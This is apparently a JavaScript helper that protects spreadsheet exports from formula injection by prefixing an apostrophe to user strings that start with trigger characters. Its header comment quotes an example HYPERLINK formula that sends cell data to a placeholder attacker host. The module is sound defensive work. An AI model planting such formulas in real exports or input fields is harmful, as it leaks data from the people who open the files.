// ──────────────────────────────────────────────────────────
// Excel formula-injection guard (SEC-004)
// ──────────────────────────────────────────────────────────
// Spreadsheet apps (Excel / LibreOffice) evaluate a cell whose value starts
// with `= + - @ \t \r` as a formula. A user-controlled string such as
// `=HYPERLINK("http://attacker.tld/?u="&A2,"Click")` therefore becomes an
// outbound-call + exfil vector the moment an admin opens an export.
//
// Defence: prepend a single apostrophe so the spreadsheet treats the value as a
// literal string (the apostrophe is not displayed and survives round-trip).
// Apply to EVERY user-controlled string that lands in a cell. Numbers, dates,
// null/undefined and non-strings pass through untouched.
//
// Single source of truth shared by the legacy exportService and the learning
// reports export so the two paths cannot drift.
// ──────────────────────────────────────────────────────────

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

const safeCell = (value) => {
  if (typeof value !== 'string') return value;
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
};

module.exports = { safeCell, FORMULA_TRIGGER };
